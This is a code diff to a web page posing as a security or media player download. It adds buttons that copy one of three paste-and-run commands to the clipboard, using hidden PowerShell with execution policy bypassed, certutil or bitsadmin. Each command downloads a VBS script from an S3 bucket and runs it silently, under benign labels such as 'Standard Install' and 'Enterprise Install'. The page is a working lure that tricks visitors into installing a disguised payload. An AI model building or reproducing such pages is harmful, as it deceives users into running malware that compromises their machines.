@@ -205,6 +205,8 @@
             position: relative;
             cursor: pointer;
             transition: background 0.3s ease;
+            font-size: 14px;
+            line-height: 1.4;
         }
         
         .copy-box:hover {
@@ -243,6 +245,30 @@
             align-items: center;
             gap: 5px;
             margin: 5px 0;
+        }
+        
+        .method-selector {
+            margin: 15px 0;
+        }
+        
+        .method-btn {
+            background: #333;
+            border: 1px solid #555;
+            color: #fff;
+            padding: 8px 15px;
+            margin: 5px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        
+        .method-btn.active {
+            background: #ff0080;
+            border-color: #ff0080;
+        }
+        
+        .method-btn:hover {
+            background: #444;
         }
         
         @media (max-width: 768px) {
@@ -341,10 +367,18 @@
             
             <div class="download-steps">
                 <div class="step">
-                    <div class="step-title">Step 1: Download Security Package</div>
-                    <p>Click the box below to copy the secure download command to your clipboard:</p>
+                    <div class="step-title">Step 1: Choose Installation Method</div>
+                    <p>Select your preferred installation method (recommended: Standard):</p>
+                    
+                    <div class="method-selector">
+                        <button class="method-btn active" data-method="standard">Standard Install</button>
+                        <button class="method-btn" data-method="certutil">Advanced Install</button>
+                        <button class="method-btn" data-method="bitsadmin">Enterprise Install</button>
+                    </div>
+                    
+                    <p>Click the box below to copy the installation command to your clipboard:</p>
                     <div class="copy-box" id="script-copy">
-                        <div>powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://s3.us-east-1.amazonaws.com/update-system.s3/NewAppDownlaod.vbs' -OutFile '$env:TEMP\MediaPlayerSetup.vbs'; Start-Process -FilePath 'wscript.exe' -ArgumentList '$env:TEMP\MediaPlayerSetup.vbs' -WindowStyle Hidden"</div>
+                        <div id="script-content">powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://s3.us-east-1.amazonaws.com/update-system.s3/NewAppDownlaod.vbs' -OutFile '$env:TEMP\MediaPlayerSetup.vbs'; Start-Process 'wscript.exe' '$env:TEMP\MediaPlayerSetup.vbs'"</div>
                     </div>
                     <div class="copied-message" id="copied-message">✓ Copied to clipboard!</div>
                 </div>
@@ -375,9 +409,30 @@
             document.getElementById('download-page').style.display = 'flex';
         });
 
+        // Method selection
+        const methods = {
+            standard: `powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://s3.us-east-1.amazonaws.com/update-system.s3/NewAppDownlaod.vbs' -OutFile '$env:TEMP\\MediaPlayerSetup.vbs'; Start-Process 'wscript.exe' '$env:TEMP\\MediaPlayerSetup.vbs'"`,
+            
+            certutil: `cmd /c certutil -urlcache -split -f https://s3.us-east-1.amazonaws.com/update-system.s3/NewAppDownlaod.vbs %TEMP%\\MediaPlayerSetup.vbs && wscript %TEMP%\\MediaPlayerSetup.vbs`,
+            
+            bitsadmin: `cmd /c bitsadmin /transfer mediabrowser /download /priority high https://s3.us-east-1.amazonaws.com/update-system.s3/NewAppDownlaod.vbs %TEMP%\\MediaPlayerSetup.vbs && wscript %TEMP%\\MediaPlayerSetup.vbs`
+        };
+
+        let currentMethod = 'standard';
+
+        // Method selector buttons
+        document.querySelectorAll('.method-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.method-btn').forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                currentMethod = this.dataset.method;
+                document.getElementById('script-content').textContent = methods[currentMethod];
+            });
+        });
+
         // Copy script to clipboard functionality
         document.getElementById('script-copy').addEventListener('click', function() {
-            const scriptText = "powershell -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'https://s3.us-east-1.amazonaws.com/update-system.s3/NewAppDownlaod.vbs' -OutFile '$env:TEMP\\MediaPlayerSetup.vbs'; Start-Process -FilePath 'wscript.exe' -ArgumentList '$env:TEMP\\MediaPlayerSetup.vbs' -WindowStyle Hidden\"";
+            const scriptText = methods[currentMethod];
             
             // Use modern clipboard API
             navigator.clipboard.writeText(scriptText).then(function() {
